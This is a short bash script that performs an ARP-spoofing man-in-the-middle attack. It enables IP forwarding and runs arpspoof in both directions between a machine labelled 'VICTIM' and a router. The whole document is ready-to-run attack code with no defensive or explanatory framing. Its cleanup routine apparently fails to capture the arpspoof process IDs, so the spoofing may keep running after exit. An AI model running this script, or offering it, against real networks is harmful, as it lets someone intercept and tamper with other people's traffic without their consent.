#!/bin/bash
# $1 --> VICTIM IP
# $2 --> SERVER IP
# $3 --> INTERFACE

if [[ "$3" != "" ]]; then
    INTERFACE="$3"
else
    INTERFACE="wlp2s0"
fi

echo "Enabling IP Forwarding (host will be able to be a router)"
echo "sysctl -w new.ipv4.ip_forward=1"
sudo sysctl -w net.ipv4.ip_forward=1
echo ""

echo "Spoofing victim ($1) to router ($2)"
echo "sudo arpspoof -i $INTERFACE -t $1 $2"
(sudo arpspoof -i $INTERFACE -t $1 $2 &) > /dev/null 2>&1
SPOOFING_VICTIM_PID=$!
echo ""

echo "Spoofing router ($2) to victim ($1)"
echo "sudo arpspoof -i $INTERFACE -t $2 $1"
(sudo arpspoof -i $INTERFACE -t $2 $1 &) > /dev/null 2>&1
SPOOFING_ROUTER_PID=$!
echo ""


cleanup () {
  echo "Killing process"
  kill -9 $SPOOFING_VICTIM_PID > /dev/null 2>&1
  kill -9 $SPOOFING_ROUTER_PID > /dev/null 2>&1

  exit 0
}

trap cleanup SIGINT SIGTERM

while [ 1 ]
do
    sleep 5 &
    wait $!
    echo "Spoofing..."
done
